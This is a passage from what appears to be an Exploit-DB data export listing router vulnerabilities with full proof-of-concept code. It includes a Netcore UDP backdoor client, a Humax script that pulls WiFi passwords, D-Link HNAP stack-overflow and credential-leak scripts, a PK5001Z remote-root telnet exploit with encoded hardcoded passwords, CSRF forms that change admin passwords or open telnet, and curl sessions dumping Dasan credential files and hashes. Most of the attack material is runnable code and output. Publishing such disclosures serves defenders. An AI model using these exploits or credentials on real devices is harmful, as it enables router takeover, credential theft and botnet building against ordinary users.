LTE wireless communication based LTE router product.
execution. The application interface allows users to perform certain
actions via HTTP requests without performing any validity checks to
verify the requests. This can be exploited to perform certain actions
with administrative privileges if a logged-in user visits a malicious
web site.
Tested on: lighttpd/1.4.20
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5443
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5443.php
22.12.2017
IDOR for system command interface:
GET /admin/system_command.shtml HTTP/1.1
PoC GET CSRF request:
<html>
<body>
<form action=""http://10.0.0.17:8081/cgi-bin/admin.cgi"">
<input type=""hidden"" name=""Command"" value=""sysCommand"" />
<input type=""hidden"" name=""Cmd"" value=""uname%20-a"" />
<input type=""hidden"" name=""T"" value=""8168008531337"" />
<input type=""submit"" value=""Send"" />
</form>
</body>
</html>"
2016-12-15,Remote,Hardware,nixawk,Netcore / Netis Routers,UDP Backdoor Access,"#!/usr/bin/python
# -*- coding: utf8 -*-
# NETCORE / NETDIS UDP 53413 BACKDOOR
# https://netisscan.shadowserver.org/
# http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/
# https://www.seebug.org/vuldb/ssvid-90227
# ['\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x00Login successed!\r\n',
#  '\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x7f']
# ['\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x7f',
#  '\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x01\x00'
#  'IGD MPT Interface daemon 1.0\x00']
# ['\x00\x00\x00\x06\x00\x01\x00\x00\xff\xff\xff\xffapmib_init fail!\r\n']
# ['\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00']
# sh: netcore: not found
# sh: /etc/services: Permission denied
# ['\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00']
# First Login  : 'AA\x00\x05ABAA\x00\x00\x00\x00Login successed!\r\n'
# Second Login : IGD MPT Interface daemon 1.0
DESCRIPTION:
# bool_ret, resp = do_mptfun(sock, host, port, '$help')
# print(resp)
# bool_ret, resp = do_getfile(sock, host, port, '/cfg/dhcpd.conf')
# print(resp)","import socket
import struct
import logging
logging.basicConfig(level=logging.INFO, format=""%(message)16s"")
def create_udp_socket(timeout=10):
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(timeout)
return sock
def send_netcore_request(sock, host, port, data):
HEAD = ""\x00"" * 8
data = HEAD + data
sock.sendto(data, (host, port))
def recv_netcore_response(sock, buffsize=512):
try:
resp = None
addr = None
resp, addr = sock.recvfrom(buffsize)
except Exception as err:
logging.debug('[-] %s' % err)
finally:
return resp, addr
def do_mptlogin(sock, host, port):
login netcore backdoor
netcore_response = []
netcore_commands = ['netcore', '?']
for command in netcore_commands:
send_netcore_request(sock, host, port, command)
resp, addr = recv_netcore_response(sock)
if resp and resp not in netcore_response:
netcore_response.append(resp)
response_string = "","".join(netcore_response)
if len(netcore_response) >= 1 and ('\x00\x00\x00\x05' in response_string):
return (True, netcore_response)
return (False, netcore_response)
def do_mptfun(sock, host, port, cmdstring):
Usage: $Help
Usage: $WriteMac <macaddr> <lan|wan|wlan1|wlan2|wlan3|wlan4>
Usage: $ReadMac <lan|wan|wlan1|wlan2|wlan3|wlan4>[<str|STR>[separator]|bin]
Usage: $WriteRegion <region> <wlan1|wlan3>
Usage: $ReadRegion <wlan1|wlan3>
Usage: $WriteSSID <SSID> <wlan1|wlan2|wlan3|wlan4>
Usage: $ReadSSID <wlan1|wlan2|wlan3|wlan4>
wlan1:2.4G main AP
wlan2:2.4G Multiple AP
wlan3:5G Main AP
wlan4:5G Multiple AP
region:the abbreviation of the country,Must be capitalized.Like US,HK,JP
send_netcore_request(sock, host, port, cmdstring)
resp, addr = recv_netcore_response(sock)
if resp:
return (True, resp)
return (False, resp)
do_syscmd = do_mptfun
def do_getfile(sock, host, port, filename):
buffsize = 0x408  # buff size to read
datasize = 0x408  # data size from socket
contents = []
u1, u2, u3, u4 = 0, 1, 0, 0
HEAD = struct.pack('>H', u1)
HEAD += struct.pack('>H', u2)
HEAD += struct.pack('>H', u3)
HEAD += struct.pack('>H', u4)
data = HEAD + filename
sock.sendto(data, (host, port))
while buffsize == datasize:
data, addr = recv_netcore_response(sock, buffsize=buffsize)
if not data:
break
datasize = len(data)
u1, u2, u3, u4 = struct.unpack('>HHHH', data[:8])
contents.append(data[8:])
u2 = 5
HEAD = struct.pack('>H', u1)
HEAD += struct.pack('>H', u2)
HEAD += struct.pack('>H', u3)
HEAD += struct.pack('>H', u4)
sock.sendto(HEAD, (host, port))
data = """".join(contents)
if contents:
return True, data
return False, data
def do_putfile():
pass
def check(host, port=53413):
sock = create_udp_socket(timeout=8)
is_login, resp = do_mptlogin(sock, host, port)
print(is_login, resp)
if is_login:
print(""[+] %s:%s - \033[32mvulnerable\033[m"" % (host, port))
bool_ret, resp = do_syscmd(sock, host, port, 'ls -al /tmp')
sock.close()
if __name__ == ""__main__"":
import sys
if len(sys.argv) != 2:
print(""[*] Usage: {} <target-netdis-ip>"".format(sys.argv[0]))
else:
check(sys.argv[1])"
2017-09-18,WebApps,Hardware,Gem George,iBall ADSL2+ Home Router,Authentication Bypass,"# Exploit Title: iBall ADSL2+ Home Router Authentication Bypass Vulnerability
# CVE: CVE-2017-14244
# Date: 15-09-2017
# Exploit Author: Gem George
# Author Contact: https://www.linkedin.com/in/gemgrge
# Vulnerable Product: iBall ADSL2+ Home Router WRA150N https://www.iball.co.in/Product/ADSL2--Home-Router/746
# Firmware version: FW_iB-LR7011A_1.0.2
# Vendor Homepage: https://www.iball.co.in
# Reference: https://www.techipick.com/iball-baton-adsl2-home-router-utstar-wa3002g4-adsl-broadband-modem-authentication-bypass","Vulnerability Details
iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, downloading backup configuration, upload backup etc.
How to reproduce
Suppose 192.168.1.1 is the router IP and one of the valid page in router is is  http://192.168.1.1/abcd.html, then the page can be directly accessed as as http://192.168.1.1/abcd.cgi
Example URLs:
* http://192.168.1.1/info.cgi – Status and details
* http://192.168.1.1/upload.cgi – Firmware Upgrade
* http://192.168.1.1/backupsettings.cgi – perform backup settings to PC
* http://192.168.1.1/pppoe.cgi – PPPoE settings
* http://192.168.1.1/resetrouter.cgi – Router reset
* http://192.168.1.1/password.cgi – password settings
POC
* https://www.youtube.com/watch?v=_SvrwCSdn54
-----------------------Greetz----------------------
++++++++++++++++++ www.0seccon.com ++++++++++++++++++
Saran,Jithin,Dhani,Vignesh,Hemanth,Sudin,Vijith,Joel"
2017-09-14,WebApps,Hardware,Kivson,Humax Wi-Fi Router HG100R 2.0.6,Authentication Bypass,"# coding: utf-8
# Exploit Title: Humax HG100R-* Authentication Bypass
# Date: 14/09/2017
# Exploit Author: Kivson
# Vendor Homepage: http://humaxdigital.com
# Version: VER 2.0.6
# Tested on: OSX Linux
# CVE : CVE-2017-11435
# The Humax Wi-Fi Router model HG100R-* 2.0.6 is prone to an authentication bypass vulnerability via specially
# crafted requests to the management console. The bug is exploitable remotely when the router is configured to
# expose the management console.
# The router is not validating the session token while returning answers for some methods in url '/api'.
# An attacker can use this vulnerability to retrieve sensitive information such
# as private/public IP addresses, SSID names, and passwords.","import sys
import requests
def print_help():
print('Exploit syntax error, Example:')
print('python exploit.py http://192.168.0.1')
def exploit(host):
print(f'Connecting to {host}')
path = '/api'
payload = '{""method"":""QuickSetupInfo"",""id"":90,""jsonrpc"":""2.0""}'
response = requests.post(host + path, data=payload)
response.raise_for_status()
if 'result' not in response.json() or 'WiFi_Info' not in response.json()['result'] or 'wlan' not in \
response.json()['result']['WiFi_Info']:
print('Error, target may be no exploitable')
return
for wlan in response.json()['result']['WiFi_Info']['wlan']:
print(f'Wifi data found:')
print(f'    SSID: {wlan[""ssid""]}')
print(f'    PWD: {wlan[""password""]}')
def main():
if len(sys.argv) < 2:
print_help()
return
host = sys.argv[1]
exploit(host)
if __name__ == '__main__':
main()"
2017-09-12,WebApps,Hardware,embedi,D-Link DIR-8xx Routers,Local Firmware Upload,"#!/bin/bash
# If you have access to an ethernet port you can upload custom firmware to a device because system recovery service is started and available for a few seconds after restart.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/update.sh","FIRMWARE=""firmware.bin""
IP=""192.168.0.1""
while true; do
T=$(($RANDOM + ($RANDOM % 2) * 32768))
STATUS=`wget -t 1 --no-cache -T 0.2 -O - http://$IP/?_=$T 2>/dev/null`
if [[ $STATUS == *""<title>Provided by D-Link</title>""* ]]; then
echo ""Uploading...""
curl -F ""data=@$FIRMWARE"" --connect-timeout 99999 -m 99999 --output /dev/null http://$IP/f2.htm
break
elif [[ $STATUS == *""<title>D-LINK</title>""* ]]; then
echo ""Rebooting...""
echo -n -e '\x00\x01\x00\x01EXEC REBOOT SYSTEMaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' | timeout 1s nc -u $IP 19541
fi
done"
2017-09-12,WebApps,Hardware,embedi,D-Link DIR-8xx Routers,Root Remote Code Execution,"# Due to error in hnap protocol implementation we can overflow stack and execute any sh commands under root priviliges.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/hnap.py
# Can differ in different version of routers and versions of firmware
# SYSTEM_ADDRESS = 0x1B570 # DIR-890L_REVA_FIRMWARE_PATCH_v1.11B02.BETA01","import requests as rq
import struct
IP = ""192.168.0.1""
PORT = ""80""
SYSTEM_ADDRESS = 0x1B50C# DIR-890L_REVA_FIRMWARE_1.10.B07
def _str(address):
return struct.pack(""<I"", address) if address > 0 else struct.pack(""<i"", address)
url = 'http://{ip}:{port}/HNAP1/'.format(ip=IP, port=PORT)
headers_text = {
'SOAPACTION' : 'http://purenetworks.com/HNAP1/Login',
'CONTENT-TYPE' : 'text/html'
payload = b""echo 1 > /tmp/hacked;""
print(rq.post(url, data=b""<Action>"" + payload + b""A"" * (0x400 - len(payload)) + _str(-1) + b""C"" * 0x14 + _str(SYSTEM_ADDRESS)[0:3] + b""</Action>"", headers=headers_text).text)"
2017-09-12,WebApps,Hardware,embedi,D-Link DIR-8xx Routers,Leak Credentials,"# phpcgi is responsible for processing requests to .php, .asp and .txt pages. Also, it checks whether a user is authorized or not. Nevertheless, if a request is crafted in a proper way, an attacker can easily bypass authorization and execute a script that returns a login and password to a router.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/phpcgi.py","import requests as rq
EQ = ""%3d""
IP = ""192.168.0.1""
PORT = ""80""
def pair(key, value):
return ""%0a_POST_"" + key + EQ + value
headers_multipart = {
'CONTENT-TYPE' : 'application/x-www-form-urlencoded'
url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP, port=PORT)
auth = ""%0aAUTHORIZED_GROUP%3d1""
data = ""A=A"" + pair(""SERVICES"", ""DEVICE.ACCOUNT"") + auth
print(rq.get(url, data=data, headers=headers_multipart).text)"
2017-03-07,WebApps,PHP,Indrajith.A.N,iBall Baton 150M Wireless Router,Authentication Bypass,"http://www.iball.co.in/Product/150M-Wireless-N-Broadband-Router/539
http://172.20.174.1/password.cgi","Title:
iball Baton 150M Wireless router - Authentication Bypass
Credit:
Name: Indrajith.A.N
Website: https://www.indrajithan.com
Date:
07-03-2017
Vendor:
iball Envisioning the tremendous potential for innovative products required
by the ever evolving users in computing and digital world, iBall was
launched in September 2001 and which is one of the leading networking
company
Product:
iball Baton 150M Wireless-N ADSI.2+ Router
Product link:
Abstract:
iball Baton 150M Router's login page is insecurely developed that any
attacker could bypass the admin's authentication just by tweaking the
password.cgi file.
Affected Version:
Firmware Version : 1.2.6 build 110401 Rel.47776n
Hardware Version : iB-WRA150N v1 00000001
Exploitation-Technique:
Remote
Severity Rating:
9
Details:
Any attacker can escalate his privilege to admin using this vulnerability.
Proof Of Concept:
1) Navigate to Routers Login page which is usually IPV4 default Gateway IP,
i.e 172.20.174.1
2) Now just append password.cgi to the URL i.e
3) Right-click and View Source code which disclsus the username, password
and user role of the admin in the comment section
4) Successfully logged in using the disclosed credentials.
Reference:
1. https://www.youtube.com/watch?v=8GZg1IuSfCs
2. https://www.techipick.com/exploiting-router-authentication-through-web-interface
Disclosure Timeline:
Vendor Notification: March 5, 2017
Indrajith.A.N"
2017-08-12,WebApps,Hardware,Touhid M.Shaikh,RealTime RWR-3G-100 Router,Cross-Site Request Forgery (Change Admin Password),"# Exploit Title: RealTime RWR-3G-100 Router Cross-Site Request Forgery
# Date: 13 Aug, 2017
# Vendor Homepage : http://www.rtsindia.com/
# Vendor Contact : https://www.linkedin.com/company/realtime-system-ltd.
# Firmware Version : Ver1.0.56
# Exploit Author: Touhid M.Shaikh
# Contact: https://github.com/touhidshaikh
# Website: http://touhidshaikh.com/","(Change Admin Password)
Product Description
Provides Wireless/ Wired Broadband connectivity to SOHO & SME. Provides
Broadband connectivity to multiple users on the move.Uses 3G/2.75G USB
Dongle to get connected to Broadband/ Optionally Uses Wired Broadband
connectivity. Supports HSPA, EVDO, UMTS, HSDPA & HSUPA USB Dongles and
Compatible with Blackberry & iPhone. Creates 802.11n Wi-Fi Hotspot for
Multiple Users to get connected to Broadband. Small & Sleek Portable
Router, Easy to Install & Manage.
<!-- CHANGE ADMIN PASSWORD to test-->
<form action=http://192.168.1.1/goform/formPasswordSetup method=POST
name=""password"">
<input type=""text"" name=""username"" value=""admin"">
<input type=""password"" name=""newpass"" value=""test"">
<input type=""password"" name=""confpass"" value=""test"">
<input type=""hidden"" value=""/status.asp"" name=""submit-url"">
<input type=""submit"" value=""Apply Changes"" name=""save"">
<input type=""reset"" value=""  Reset  "" name=""reset"" id=""password Reset"">
</form>
<!-- CHANGE ADMIN PASSWORD Ends here-->
<!---Enable The UPNP Service-->
<form action=http://192.168.1.1/goform/formUpnpSetup method=POST
name=""upnpSetup"">
<input type=""radio"" name=""upnpfunction"" id=""upnpfunctiony"" value=""yes""
checked>
<input type=""radio"" name=""upnpfunction"" id=""upnpfunctionn"" value=""no"" >
<input type=""radio"" name=""avupnpfunction"" id=""avupnpfunctiony""
value=""yes"" checked>
<input type=""radio"" name=""avupnpfunction"" id=""avupnpfunctionn"" value=""no""
<input type=""submit"" value=""Apply Changes"" name=""save"" id=""upnp apply"" >
<input type=""reset"" value=""  Reset  "" name=""reset"" id=""upnp Reset"">
<input type=""hidden"" value=""/upnp.asp"" name=""submit-url"">
</form>
<!---Enable The UPNP Service Ends here-->
======GREEtZ=====
my cool Broo and Pratik K.tjani"
2017-07-24,Remote,Hardware,oxagast,CenturyLink ZyXEL PK5001Z Router,Root Remote Code Execution,"/*  PK5001Z CenturyLink Router/Modem remote root exploit                  */
/*             oxagast / Marshall Whittaker                               */
/* marshall@likon:[~/Code/pk5001zpwn]: gcc pk5001z00pin.c -o pk5001z00pin */
/* marshall@likon:[~/Code/pk5001zpwn]: ./pk5001z00pin                     */
/* PK5001Z CenturyLink Router remote root 0day                            */
/* Enjoy!                                                                 */
/*   --oxagast                                                            */
/* marshall@likon:[~/Code/pk5001zpwn]: ./pk5001z00pin 192.168.0.1         */
/*                                                                        */
/* # uname -a; id;                                                        */
/* Linux PK5001Z 2.6.20.19 #54 Wed Oct 14 11:17:48 CST 2015 mips unknown  */
/* uid=0(root) gid=0(root)                                                */
/* #                                                                      */
/*                                                                        */
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#define END_STRING ""chau\n""
#define COMPLETE_STRING ""fin-respuesta""
#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL SO_NOSIGPIPE
#endif
#define perro(x)                                                               \","{                                                                            \
fprintf(stderr, ""%s:%d: %s: %s\n"", __FILE__, __LINE__, x,                  \
strerror(errno));                                                  \
exit(1);                                                                   \
void send_root(int sock, int pid) {
char buf[1024] = {0};
char getal[1024] = ""\x61\x64\x6d\x69\x6e\x0a"";
char getap[1024] = ""\x43\x65\x6e\x74\x75\x72\x79\x4c\x31\x6e\x6b\x0a"";
char getrl[1024] = ""\x73\x75\x20\x72\x6f\x6f\x74\x0a"";
char getrp[1024] = ""\x7a\x79\x61\x64\x35\x30\x30\x31"";
recv(sock, buf, 1024 - 1, 0);
sleep(1);
if (strncmp(getal, END_STRING, strlen(END_STRING)) == 0)
if (send(sock, getal, strlen(getal) + 1, 0) < 0)
perro(""send"");
recv(sock, buf, 1024 - 1, 0);
sleep(1);
if (strncmp(getap, END_STRING, strlen(END_STRING)) == 0)
if (send(sock, getap, strlen(getap) + 1, 0) < 0)
perro(""send"");
sleep(2);
recv(sock, buf, 1024 - 1, 0);
if (strncmp(getrl, END_STRING, strlen(END_STRING)) == 0)
if (send(sock, getrl, strlen(getrl) + 1, 0) < 0)
perro(""send"");
sleep(2);
recv(sock, buf, 1024 - 1, 0);
if (strncmp(getrp, END_STRING, strlen(END_STRING)) == 0)
if (send(sock, getrp, strlen(getrp) + 1, 0) < 0)
perro(""send"");
sleep(2);
void send_cmd(int sock, int pid) {
char str[1024] = {0};
while (fgets(str, 1024, stdin) == str) {
if (strncmp(str, END_STRING, strlen(END_STRING)) == 0)
break;
if (send(sock, str, strlen(str) + 1, 0) < 0)
perro(""send"");
kill(pid, SIGKILL);
void sys_info(int sock, int pid) {
char buf[1024] = {0};
char sysinfo[1024] = ""\nuname -a; id;\n"";
if (strncmp(sysinfo, END_STRING, strlen(END_STRING)) == 0)
if (send(sock, sysinfo, strlen(sysinfo) + 1, 0) < 0)
perro(""send"");
sleep(1);
int filled = 0;
while (filled = recv(sock, buf, 1024 - 1, 0)) {
buf[filled] = '\0';
printf(""%s"", buf);
fflush(stdout);
kill(pid, SIGKILL);
void receive(int sock) {
char buf[1024] = {0};
int filled = 0;
while (filled = recv(sock, buf, 1024 - 1, 0)) {
buf[filled] = '\0';
printf(""%s"", buf);
fflush(stdout);
int main(int argc, char **argv) {
if (argc != 2) {
printf(""PK5001Z CenturyLink Router remote root 0day\nEnjoy!\n"");
printf(""   --oxagast\n"");
exit(1);
int sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == -1)
perro(""socket"");
struct in_addr server_addr;
if (!inet_aton(argv[1], &server_addr))
perro(""inet_aton"");
struct sockaddr_in connection;
connection.sin_family = AF_INET;
memcpy(&connection.sin_addr, &server_addr, sizeof(server_addr));
connection.sin_port = htons(23);
if (connect(sock, (const struct sockaddr *)&connection, sizeof(connection)) !=
0)
perro(""connect"");
sleep(1);
int pid_root, pid_sys, pid_shell;
sleep(1);
send_root(sock, pid_root);
if (pid_shell = fork())
sys_info(sock, pid_sys);
if (pid_shell = fork())
send_cmd(sock, pid_shell);
else
receive(sock);
return (0);"
2017-07-13,WebApps,Hardware,LiquidWorm,Dasan Networks GPON ONT WiFi Router H64X Series,Configuration Download,"Summary: H64xx is comprised of one G-PON uplink port and four ports
Desc: The system backup configuration file 'running.CFG' and the wireless
#1 This PoC request is assuming that the admin or a user created a backup. This is done by first issuing a request
######################################################################## 100.0%
######################################################################## 100.0%
#2 This PoC request will do an authentication bypass using the Grant cookie to create the running.CFG file.","Dasan Networks GPON ONT WiFi Router H64X Series System Config Download
Vendor: Dasan Networks
Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
Affected version: Models: H640GR-02
H640GV-03
H640GW-02
H640RW-02
H645G
Firmware: 3.02p2-1141
2.77p1-1125
2.77-1115
2.76-9999
2.76-1101
2.67-1070
2.45-1045
Versions 3.03x are not affected by this issue.
The running.CFG/wifi.CFG backup files are now 7z password protected.
of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
helps service providers to extend their core optical network all the
way to their subscribers, eliminating bandwidth bottlenecks in the
last mile. H64xx is integrated device that provide the high quality
Internet, telephony service (VoIP) and IPTV or OTT content for home
or office. H64xx enable the subscribers to make a phone call whose
quality is equal to PSTN at competitive price, and enjoy the high
quality resolution live video and service such as VoD or High Speed
Internet.
backup configuration file 'wifi.CFG' can be downloaded by an attacker
from the root directory in certain circumstances. This will enable the
attacker to disclose sensitive information and help her in authentication
bypass, privilege escalation and/or full system access.
Tested on: Server: lighttpd/1.4.31
Server: DasanNetwork Solution
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5424
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5424.php
19.05.2017
to: /cgi-bin/backuprecoversystembackup_action.cgi or /cgi-bin/backuprecoverwifibackup_action.cgi scripts that
instructs the web server to generate the running.CFG or wifi.CFG gziped files respectively.
curl http://192.168.0.1/running.CFG -# | gunzip > dasan_output.txt ; strings dasan_output.txt | grep -rn 'admin:'
(standard input):180:admin:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:admin:/etc:/bin/sh
(standard input):1442:admin:admin123:2
bash-4.4$ curl http://192.168.0.1/running.CFG -# | gunzip > dasan_output.txt ; strings dasan_output.txt | grep -rn 'root:'
(standard input):181:root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:root:/etc:/bin/sh
(standard input):191:root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:14987:0:99999:7:::
bash-4.4$
Notice the same hard-coded shell credentials for admin and root user.
Left for the viewer to exercise 'cracking the perimeter'. ;]
In this request we're using Grant=1 with the account 'user' which by default has the password: user. After that,
decompressing the file, navigating to 'etc' extracted directory and reading 'web_user' file which can then
escalate privileges by reading the admin password and loggin-in.
bash-4.4$ curl http://192.168.0.1/cgi-bin/backuprecoversystembackup_action.cgi --cookie ""silverheader=0c; Grant=1; Language=english"" -H ""X-Requested-With: XMLHttpRequest"" ; sleep 5
bash-4.4$ curl http://192.168.0.1/running.CFG -vv --cookie ""silverheader=0c; Grant=1; Language=english"" -O
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.0.1...
* TCP_NODELAY set
* Connected to 192.168.0.1 (192.168.0.1) port 80 (#0)
> GET /running.CFG HTTP/1.1
> Host: 192.168.0.1
> User-Agent: curl/7.51.0
> Accept: */*
> Cookie: silverheader=0c; Grant=1; Language=english
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Accept-Ranges: bytes
< ETag: ""2477069903""
< Last-Modified: Wed, 12 Jul 2017 19:14:18 GMT
< Content-Length: 10467
< Date: Thu, 13 Jul 2017 00:56:14 GMT
< Server: lighttpd/1.4.31
{ [1208 bytes data]
53 10467   53  5528    0     0   5974      0  0:00:01 --:--:--  0:00:01  5969* Curl_http_done: called premature == 0
100 10467  100 10467    0     0  11290      0 --:--:-- --:--:-- --:--:-- 11279
* Connection #0 to host 192.168.0.1 left intact
bash-4.4$ file running.CFG
running.CFG: gzip compressed data, last modified: Wed Jul 12 19:12:36 2017, max compression, from Unix
bash-4.4$ gunzip -v -d --suffix .CFG running.CFG ; tar -xf running ; cd etc ; cat web_user
running.CFG:     85.6% -- replaced with running
admin:admin123:2
user:user:1
bash-4.4$
Or just:
bash-4.4$ curl -O http://180.148.2.139/running.CFG
bash-4.4$ tar -zxf running.CFG
bash-4.4$ cd etc
bash-4.4$ ls
INPUT_FILTER.conf                    fire_wall.conf                       lan_static_ip.conf                   ntp.conf                             radvd_param.conf                     upnpigd.conf
INPUT_REMOTE_ACCESS.conf             fire_wall.sh                         lighttpd.conf                        other_security_status.sh             remote_mgmt.conf                     user_ipv6tables.conf
dasan_output.txt                     hostname                             localtime                            passwd                               routing_entry.conf                   user_wan_cfg.conf
dhcp_client_dns.sh                   inet_check_file                      mac_filter.conf                      port_forward.conf                    shadow                               wan_ppp_mode.conf
dhcp_client_dynamic_default_dns.conf ipupdate.conf                        mac_source_match.conf                port_forward.sh                      snmp                                 web-enable
dhcpv6d.conf                         ipv6_route.conf                      multi_language.conf                  port_forward_dnat.sh                 snmp_status.conf                     web_user
dhcpv6d_param.conf                   is_safe_nat_option                   nat_route.conf                       port_forward_gre.sh                  sys_login_max_num                    webrefreshtime.conf
dmz.conf                             lan_dhcp_model.sh                    net_rest.conf                        ppp                                  syslog.confx                         websesstime.conf
ds_mode_config                       lan_dhcp_server_static_ip.conf       ns_ftp.conf                          radvd.conf                           udhcpd.conf
bash-4.4$ cat web_user
admin:admin123:2
user:user:1
bash-4.4$ cat ./.config/ds_user_pw
admin
bash-4.4$ cat passwd
admin:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:admin:/etc:/bin/sh
root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:root:/etc:/bin/sh"
2017-07-13,WebApps,Hardware,LiquidWorm,Dasan Networks GPON ONT WiFi Router H64X Series,Privilege Escalation,"Summary: H64xx is comprised of one G-PON uplink port and four ports
Desc: The application suffers from a privilege escalation vulnerability.","Dasan Networks GPON ONT WiFi Router H64X Series Privilege Escalation
Vendor: Dasan Networks
Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
Affected version: Model: H640GR-02
H640GV-03
H640GW-02
H640RW-02
H645G
Firmware: 2.77-1115
2.76-9999
2.76-1101
2.67-1070
2.45-1045
of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
helps service providers to extend their core optical network all the
way to their subscribers, eliminating bandwidth bottlenecks in the
last mile. H64xx is integrated device that provide the high quality
Internet, telephony service (VoIP) and IPTV or OTT content for home
or office. H64xx enable the subscribers to make a phone call whose
quality is equal to PSTN at competitive price, and enjoy the high
quality resolution live video and service such as VoD or High Speed
Internet.
A normal user can elevate his/her privileges by changing the Cookie 'Grant'
from 1 (user) to 2 (admin) gaining administrative privileges and revealing
additional functionalities or additional advanced menu settings.
Tested on: Server: lighttpd/1.4.31
Server: DasanNetwork Solution
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5423
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5423.php
19.05.2017
Change cookie Grant=1 (user) to Grant=2 (admin):
GET /cgi-bin/index.cgi HTTP/1.1
Host: 192.168.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Bond-James-Bond/007
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,mk;q=0.6
Cookie: Grant=2; Language=macedonian; silverheader=3c
Connection: close"
2017-07-13,WebApps,Hardware,LiquidWorm,Dasan Networks GPON ONT WiFi Router H64X Series,Cross-Site Request Forgery,"Summary: H64xx is comprised of one G-PON uplink port and four ports
Desc: The application interface allows users to perform certain actions","Dasan Networks GPON ONT WiFi Router H64X Series Cross-Site Request Forgery
Vendor: Dasan Networks
Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
Affected version: Model: H640GR-02
H640GV-03
H640GW-02
H640RW-02
H645G
Firmware: 3.03p1-1145
3.03-1144-01
3.02p2-1141
2.77p1-1125
2.77-1115
2.76-9999
2.76-1101
2.67-1070
2.45-1045
of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
helps service providers to extend their core optical network all the
way to their subscribers, eliminating bandwidth bottlenecks in the
last mile. H64xx is integrated device that provide the high quality
Internet, telephony service (VoIP) and IPTV or OTT content for home
or office. H64xx enable the subscribers to make a phone call whose
quality is equal to PSTN at competitive price, and enjoy the high
quality resolution live video and service such as VoD or High Speed
Internet.
via HTTP requests without performing any validity checks to verify the
requests. This can be exploited to perform certain, if not all actions
with administrative privileges if a logged-in user visits a malicious
web site.
Tested on: Server: lighttpd/1.4.31
Server: DasanNetwork Solution
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5422
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5422.php
19.05.2017
Enable telnet access (disable telnet blocking):
Enable web access (disable web blocking):
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.0.1:8080/cgi-bin/remote_mgmt_action.cgi"" method=""POST"">
<input type=""hidden"" name=""rdoIPhost2TelnetBlocking"" value=""0"" />
<input type=""hidden"" name=""rdoIPhost2WebBlocking"" value=""0"" />
<input type=""hidden"" name=""waiting&#95;action"" value=""1"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
Increase session timeout (0: disable, min: 1, max: 60):
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.0.1:8080/cgi-bin/websetting_action.cgi"" method=""POST"">
<input type=""hidden"" name=""sessionTimeout"" value=""60"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2017-07-13,WebApps,Hardware,LiquidWorm,Dasan Networks GPON ONT WiFi Router H64X Series,Authentication Bypass,"Summary: H64xx is comprised of one G-PON uplink port and four ports
Desc: The vulnerable device does not properly perform authentication","Dasan Networks GPON ONT WiFi Router H64X Series Authentication Bypass
Vendor: Dasan Networks
